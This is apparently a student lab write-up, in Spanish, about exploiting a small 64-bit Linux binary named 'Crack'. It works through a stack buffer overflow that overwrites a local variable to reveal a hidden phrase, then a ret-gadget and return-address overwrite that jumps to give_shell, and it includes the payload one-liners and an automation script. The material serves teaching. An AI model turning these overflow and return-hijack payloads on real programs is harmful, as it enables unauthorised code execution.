### Reconocimiento

###### Strings
```bash
strings -C Crack
```
![[Pasted image 20250305115746.png]]

La frase oculta es **"Wow! el secreto eres tumismo"**, presente en las cadenas del binario. Para obtenerla al ejecutar el programa, es probable que se deba ingresar la contraseña correcta. Según el contexto, la contraseña podría ser **"MUTIH"** (cadena visible en el output de `strings`).

###### Primera ejecución
![[Pasted image 20250304141819.png]]
###### Hexdump
```bash
hexdump -C Crack
```
![[Pasted image 20250305115602.png]]
###### Ltrace
```bash
echo "contraseña1" | ltrace ./Crack
```
![[Pasted image 20250305120005.png]]

###### gdb
```bash
gdb Crack
```
![[Pasted image 20250305131420.png]]

![[Pasted image 20250305131454.png]]


###### Ghidra
![[Pasted image 20250304142802.png]]

**![[Pasted image 20250304143026.png]]

![[Pasted image 20250304143811.png]]

### Identificación de Vulnerabilidades
###### Análisis
![[Pasted image 20250305161155.png]]

![[Pasted image 20250305160607.png]]
0x49 = 'I'  
0x54 = 'T'  
0x55 = 'U'  
0x4d = 'M'

Pero en los sistemas x86 almacenan los bytes en orden inverso.

>  Por lo tanto, 0x1337 en little-endian se escribe como \x37\x13\x00\x00 para ocupar 4 bytes, ya que local_c es un entero de 4 bytes.

![[Pasted image 20250305161228.png]]

La variable local_78 es el buffer, y local_c está en una posición específica relativa al base pointer (rbp). 

 El registro [RBP (Base Pointer) se usa como puntero base para acceder a variables locales y argumentos en el stack durante la ejecución de una función.][3]
Mantiene una referencia fija al inicio del stack frame actual, permitiendo acceder a variables locales de manera predecible, en este caso rbp - 0x4, rbp - 0x70, etc.

El codigo decompilado por ghidra, es este:
```C
undefined8 main(void)

{
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  int local_c;
  
  local_c = 0x4954554d;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  read(0,&local_78,0x100);
  if (local_c == 0x1337) {
    puts("Wow! el secreto eres tumismo");
  }
  else {
    puts("Aun no te puedo decir el secreto");
  }
  return 0;
}
```

### Preparación de Ataque
Cada variable ocupa una cantidad de bytes de entrada, haciendo un análisis como el siguiente, obtenemos el tamaño del búffer.

```C
undefined8 main(void) {
    undefined8 local_78;  // rbp - 0x70 (112 bytes)
    // ... 13 variables undefined8 más (104 bytes)
    undefined4 local_18;  // rbp - 0x18 (4 bytes)
    int local_c;          // rbp - 0x4  (4 bytes)
}
```

>0x70 equivale a 112 bytes

>La función `read()` se dispone a leer 256 bytes (0x100)
>Es decir, que se dispone a leer 256 bytes en un búffer de 112 bytes

>Para perfilar el ataque, tendremos que escribir la información esperada MUTI (4 bytes), más lo necesario para completar el búffer (112 bytes)

La diferencia entre las direcciones de rbp - 0x70 (local_78) y rbp - 0x4 (local_c) da el offset de 108 bytes.
```python
0x70 (hex) - 0x4 (hex) = 0x6C (hex) = 108 (decimal)
```
Sobrescribiendo así la variable `local_c`, nos permitimos ejecutar el buffer overflow. (`read()` permite leer más bytes de los que el buffer puede contener)

### Explotación
Para ejecutar código remoto, necesitamos controlar el flujo del programa. La idea es sobrescribir la dirección de retorno para que apunte a nuestro shellcode. 
Pero primero, habrá que validar que el shellcode se encuentre en una ubicación predecible en la memoria. 

``` java
112 (buffer) + 8 (RBP) = 120 bytes
```

En gdb podemos validar la existencia de un `/bin/sh` y de su ejecución. Para que nuestrro vector de ataque consista en redirigir el flujo a esta función. Es decir sobreescribir la dirección de retorno con el `give_shell()`
![[Pasted image 20250311114113.png]]
Con `objdump`  podemos validar la dirección a reescribir.
![[Pasted image 20250311114907.png]]
Podemos inferir que el binario tiene una estructura así:
```c
if (password == 0x1337) {
    give_shell();
}
```

Si nos detenemos en el dato de la give_shell y los bytes para ret, nuestro payload lo podemos escribir así:
```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*120 + b"\x02\x12\x40\x00\x00\x00\x00\x00")' > payload.bin
```

Sin embargo, nuestro vector de ataque no está completado.

###### Alineación de la pila

>Gadget: Secuencias de instrucciones ya existentes en la memoria del ejecutable.

>`ret` es una instrucción de ensamblador que retorna de una función. 

Por ejemplo en el código decompilado, encontrábamos instrucciones como las siguientes:
```nasm
pop rip ; Extrae la dirección de retorno del stack y salta ella
```

[Los "gadgets" los usamos como comodines para ajustar la alineación del stack.][4]
Dada la arquitectura usada, nos valemos de `ret_addr`, el cual añade un gadget `ret` para cachar el control de la pila, es decir, alinearla a 16 bytes (necesario en x86_64). Esto último para poder llamar a la función que ejecuta los comandos, caso contrario, ocurren errores como _Violación de segmento_ (el programa accede a una parte de la memoria que no está permitida.)
###### ¿Como ejecuto el payload?
Además de enviar nuestra carga útil al binario, necesitamos mantener la entrada estándar (`stdin`) abierta después de enviar el payload. Esto lo logramos con `cat -`.
Así que al comando que manda el payload al binario: `cat payload.bin | ./Crack`, le agregamos esto último:
```bash
$ ( cat payload.bin; cat -) | ./Crack
```

Así es como definimos nuestro nuevo payload:
```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*120 + b"\x16\x10\x40\x00\x00\x00\x00\x00" + b"\x02\x12\x40\x00\x00\x00\x00\x00")' > payload.bin
```

![[Pasted image 20250311124347.png]]

### Post-Explotación
Nuestro script, tratará de juntar la construcción del payload:
```bash
#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*120 + 
    b"\x16\x10\x40\x00\x00\x00\x00\x00" +  # gadget ret (0x401016)
    b"\x02\x12\x40\x00\x00\x00\x00\x00"    # give_shell() (0x401202)
)' > payload.bin

(cat payload.bin; cat -) | ./Crack
```

### Preguntas Requeridas
##### 1. ¿Qué tipo de ejecutable es?
   Dado que se observa como enlazador dinámico `/lib64/ld-linux-x86-64.so.2` , podemos inferir que [se trata de un binario **ELF de 64 bits** compilado para Linux.][1]
##### 2. ¿De dónde es compilado?
   Dada la sección [Strings](#Strings), sabemos que el binario fue compilado en **Debian** usando **GCC versión 14.2.0** (según la cadena `GCC: (Debian 14.2.0-8) 14.2.0`).
##### 3. ¿Cómo obtener frase?
Una vez perfilado el ataque de búffer overflow:
```
|-------------------|
| 108 bytes de "A"  | <- Llenan el buffer hasta local_c.
|-------------------|
| \x37\x13\x00\x00  | <- Sobrescribe local_c con 0x1337.
|-------------------|
```

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\x37\x13\x00\x00")' | ./Crack
```

![[Pasted image 20250305170513.png]]
##### 4. ¿Cómo obtener ejecución remota?
Para obtener la ejecución remota se necesita llegar a la dirección de retorno:
``` java
112 (buffer) + 8 (RBP) = 120 bytes
```

En gdb podemos validar la existencia de un `/bin/sh` y de su ejecución. Para que nuestrro vector de ataque consista en redirigir el flujo a esta función. Es decir sobreescribir la dirección de retorno con el `give_shell()`
![[Pasted image 20250311114113.png]]
Con `objdump`  podemos validar la dirección a reescribir.
![[Pasted image 20250311114907.png]]

Necesitamos mantener la entrada estándar (`stdin`) abierta después de enviar el payload. Esto lo logramos con `cat -`.
Así que al comando que manda el payload al binario: `cat payload.bin | ./Crack`, le agregamos esto último:
```bash
$ ( cat payload.bin; cat -) | ./Crack
```

Así es como definimos nuestro nuevo payload:
```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*120 + b"\x16\x10\x40\x00\x00\x00\x00\x00" + b"\x02\x12\x40\x00\x00\x00\x00\x00")' > payload.bin
```

![[Pasted image 20250311124347.png]]

##### 5. Script automatizador
Nuestro script, tratará de juntar la construcción del payload:
```bash
#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*120 + 
    b"\x16\x10\x40\x00\x00\x00\x00\x00" +  # gadget ret (0x401016)
    b"\x02\x12\x40\x00\x00\x00\x00\x00"    # give_shell() (0x401202)
)' > payload.bin

(cat payload.bin; cat -) | ./Crack
```

![[Pasted image 20250311124901.png]]
### Referencias

How programs get run: ELF binaries [LWN.net]. (s. f.). 
[1]: https://lwn.net/Articles/631631/
	En este artículo se explica cómo se cargan las secciones de código de un archivo ELF (Executable and Linkable Format) en la memoria desde un entorno Linux. Desde la carga y ejecución de un binario ELF, el papel del enlazador dinámico y cómo se gestionan las bibliotecas compartidas.
	
	El **enlazador dinámico** gestiona bibliotecas dinámicas compartidas en nombre de un ejecutable,  es decir, cargar bibliotecas en memoria y modificar el programa en tiempo de ejecución para que pueda llamar a las funciones de éstas.
	Para que los programas utilicen bibliotecas compartidas sin incluir todo el código en el ejecutable, ahorrando memoria y facilitando las actualizaciones.
	Este archivo en un binario indica que el ejecutable está diseñado para una arquitectura de 64 bits y utiliza bibliotecas compartidas. 

What Is /lib64/ld-linux-x86-64.so.2?
[2]: https://www.baeldung.com/linux/dynamic-linker
	En la entrada **PT_INTERP** de la tabla de encabezados del archivo ELF permite al SO saber qué enlazador utilizar para cargar las bibliotecas necesarias en tiempo de ejecución.
	El archivo **/lib64/ld-linux-x86-64.so.2** es el enlazador dinámico predeterminado para binarios ELF de 64 bits en sistemas Linux.

What is the purpose of the RBP register in x86_64 assembler?
[3]: https://stackoverflow.com/questions/41912684/what-is-the-purpose-of-the-rbp-register-in-x86-64-assembler
	En este sitio hay una definición y explicación de RPB

Return-Oriented Programming
[4]: Wikipedia contributors. Return-oriented programming. Wikipedia. https://en.wikipedia.org/wiki/Return-oriented_programming
	Este artículo habla de una parte importante del vector de ataque (alineación del stack). Consiste en obtener el control de las llamadas de la pila, secuestrando el flujo de control, para luego ejecutar una secuencia de  instrucciones de máquina ya presentes en la memoria (gadgets). Cada gadget encontrado en una subrutina termina en un instrucción de devolución.